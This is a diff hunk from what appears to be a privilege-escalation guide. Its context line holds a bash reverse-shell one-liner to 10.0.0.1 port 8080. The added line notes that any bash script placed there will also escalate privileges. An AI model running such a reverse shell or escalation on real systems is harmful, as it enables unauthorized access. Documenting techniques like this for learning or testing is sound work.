@@ -22,7 +22,7 @@ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
 [OR]
 
-anytype of reverse shell
+anytype of reverse shell ( IT DOESN'T HAVE TO BE A REVERSE SHELL. YOU CAN JUST PUT A BASH SCRIPT ON IT AND IT WILL STILL ESCALATE)
 
 ![image](https://user-images.githubusercontent.com/96658935/147715530-66a0121b-9e16-4cc2-ac10-84a20ada9329.png)
 
